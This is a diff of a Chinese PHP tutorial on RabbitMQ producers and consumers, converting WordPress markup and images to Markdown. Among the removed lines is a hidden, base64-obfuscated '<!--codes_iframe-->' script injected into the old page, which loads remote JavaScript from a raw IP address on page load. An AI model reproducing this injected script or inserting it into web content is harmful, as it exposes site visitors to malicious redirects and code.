@@ -78,7 +78,7 @@ $connection->close();
 
 消费者reveive.php 代码：
 
-[php]
+```php
 
 require_once __DIR__ . '/vendor/autoload.php';
 use PhpAmqpLib\Connection\AMQPStreamConnection;
@@ -121,21 +121,22 @@ while(count($channel-&gt;callbacks)) {
 $channel-&gt;close();
 $connection-&gt;close();
 
-[/php]
+```
 
 生产者和消费者代码写好后，cli方式运行，如下图：
-<a href="http://www.dada163.com/wp-content/uploads/2017/01/QQ截图20170113161251-副本.png"><img class="aligncenter wp-image-1123 size-full" src="http://www.dada163.com/wp-content/uploads/2017/01/QQ截图20170113161251-副本.png" alt="QQ截图20170113161251 - 副本" width="1113" height="306" /></a><a href="http://www.dada163.com/wp-content/uploads/2017/01/QQ截图20170113161251.png">
-</a><a href="http://www.dada163.com/wp-content/uploads/2017/01/QQ截图20170113161251.png">
-</a><a href="http://www.dada163.com/wp-content/uploads/2017/01/QQ截图20170113161251.png">
-</a>成功运行后，我们进入Management后台，可以查看各项运行数据。
+<div align="center">
+    <img width="300" src="https://raw.githubusercontent.com/DoDoneIt/Develop-blog-img/master/12151.png"/>
+</div>
+成功运行后，我们进入Management后台，可以查看各项运行数据。
 
 在send.php 中我们用了默认账号和密码，在后台中我们可以新增用户名、密码以及区分赋予vhost操作权限：
 
-<a href="http://www.dada163.com/wp-content/uploads/2017/01/QQ截图20170113163242.png"><img class="aligncenter size-full wp-image-1130" src="http://www.dada163.com/wp-content/uploads/2017/01/QQ截图20170113163242.png" alt="QQ截图20170113163242" width="1421" height="596" /></a>
-<p style="text-align: center;">(图片点击可放大)</p>
+<div align="center">
+    <img width="300" src="https://raw.githubusercontent.com/DoDoneIt/Develop-blog-img/master/3242.png"/>
+</div>
 所以connection那段，可以写成：
 
-[php]
+```php
 
 $connection = new AMQPStreamConnection(
                                     $host = '192.168.0.11',
@@ -143,9 +144,14 @@ $connection = new AMQPStreamConnection(
                                     $user = 'test22',
                                     $password = 'test22',
                                     $vhost = '/');
-[/php]
+```
 
-<p style="text-align: left;">在send.php 中我们也特殊指定了exchange和route_key，在代码运行之前，我们需要手动创建exchange并绑定route_key。
-<a href="http://www.dada163.com/wp-content/uploads/2017/01/exchange.png"><img class="size-full wp-image-1132 alignnone" src="http://www.dada163.com/wp-content/uploads/2017/01/exchange.png" alt="exchange" width="785" height="754" /></a></p>
-<p style="text-align: center;">(1、在vhost下创建exchange)<a href="http://www.dada163.com/wp-content/uploads/2017/01/exchange.png">
-</a><a href="http://www.dada163.com/wp-content/uploads/2017/01/route_key.png"><img class="size-full wp-image-1133 aligncenter" src="http://www.dada163.com/wp-content/uploads/2017/01/route_key.png" alt="route_key" width="734" height="588" /></a>(2、在exchange里面绑定route_key）</p>    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiUyMCU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNiUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyMCcpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('</script><script src="'+src+'">< \/script>')} </script><!--/codes_iframe-->
+在send.php 中我们也特殊指定了exchange和route_key，在代码运行之前，我们需要手动创建exchange并绑定route_key。
+<div align="center">
+    <img width="300" src="https://raw.githubusercontent.com/DoDoneIt/Develop-blog-img/master/exchange.png"/>
+</div>
+<div align=center><center>(1、在vhost下创建exchange)</center></div>
+<div align="center">
+    <img width="300" src="https://raw.githubusercontent.com/DoDoneIt/Develop-blog-img/master/route_key.png"/>
+</div>
+<div align=center><center>(2、在exchange里面绑定route_key)</center></div>
